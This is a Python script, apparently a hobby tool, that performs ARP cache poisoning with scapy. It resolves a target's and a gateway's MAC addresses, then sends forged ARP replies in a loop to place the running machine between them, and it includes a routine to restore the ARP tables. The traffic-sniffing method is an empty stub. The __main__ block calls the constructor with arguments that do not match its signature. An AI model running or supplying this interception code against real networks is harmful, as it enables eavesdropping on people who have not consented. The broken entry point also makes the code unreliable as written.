import os
import sys
from rich.console import Console
from textual.widgets import TextLog
from multiprocessing import Process
import subprocess
import time
from scapy.all import (ARP, Ether, conf, get_if_hwaddr,send, sniff, sndrcv, srp, wrpcap)

def get_target_mac(ip):
    packet=Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(op="who-has",pdst=ip)
    resp,_=srp(packet,timeout=2,retry=10,verbose=False)
    for _, r in resp:
        return(r[Ether].src)

class ArpPoison:
    loop=True
    def __init__(self,tlog:TextLog ,tlog2:TextLog ,targip,gateway,interf='en0') -> None:
        self.log1=tlog
        self.log2=tlog2
        self.target=targip
        console=Console()
        tlog.write(console.status("[bold green]Working on tasks..."))
        self.targetMAC=get_target_mac(targip)
        self.gateway=gateway
        self.gatewayMAC=get_target_mac(gateway)
        self.iface=interf
        conf.verb=0
        tlog.write(f'initialized {interf}:')
        tlog.write(f'Gateway ({gateway}) is at {self.gatewayMAC}')
        tlog.write(f'Target is ({targip}) is at {self.targetMAC}')
    
    def run(self):
        self.poison_thread = Process(target=self.poison)
        self.poison_thread.start()
        self.sniff_thread=Process(target=self.sniff)
        self.sniff_thread.start()

    def poison(self):
        self.loop=True
        console1=Console()
        self.log2.clear()
        self.log2.write(console1.status("[bold green]Working on tasks..."))
        poison_targ=ARP()
        poison_targ.op=2
        poison_targ.psrc=self.gateway
        poison_targ.pdst=self.target
        poison_targ.hwdst=self.targetMAC
        self.log2.write(f'ip src: {poison_targ.psrc}')
        self.log2.write(f'ip dst: {poison_targ.pdst}')
        self.log2.write(f'mac dst: {poison_targ.hwdst}')
        self.log2.write(f'mac src: {poison_targ.hwsrc}')
        self.log2.write(poison_targ.summary())
        poison_gtw=ARP()
        poison_gtw.op=2
        poison_gtw.psrc=self.target
        poison_gtw.pdst=self.gateway
        poison_gtw.hwdst=self.gatewayMAC
        self.log2.write(f'ip src: {poison_gtw.psrc}')
        self.log2.write(f'ip dst: {poison_gtw.pdst}')
        self.log2.write(f'mac dst: {poison_gtw.hwdst}')
        self.log2.write(f'mac_src: {poison_gtw.hwsrc}')
        self.log2.write(poison_gtw.summary())
        self.log2.write('-'*60)
        self.log2.write(f'Beginning the ARP poison.')      
        while self.loop:
            self.log2.write(console1.status("[Purple]Working on tasks..."))
            send(poison_targ,verbose=False)
            send(poison_gtw,verbose=False)
            time.sleep(2)
        self.log2.clear()
        self.log2.write("ARP cache restored.")
        self.restore()


    def ARPstop(self):self.loop=False

    def sniff(self,count=200):
        pass

    def restore(self):
        print("Restoring ARP tables....")
        send(ARP(
                op=2,
                psrc=self.gateway,
                hwsrc=self.gatewayMAC,
                pdst=self.target,
                hwdst='ff:ff:ff:ff:ff:ff'),
                count=5,verbose=False)
        send(ARP(
                op=2,
                psrc=self.target,
                hwsrc=self.targetMAC,
                pdst=self.gateway,
                hwdst='ff:ff:ff:ff:ff:ff'),
                count=5,verbose=False)



if __name__=="__main__":
    #print(get_target_mac(input("ip:")))
    p=ArpPoison(input("target:"),input("gateway:"),input("intf:"))
    p.run()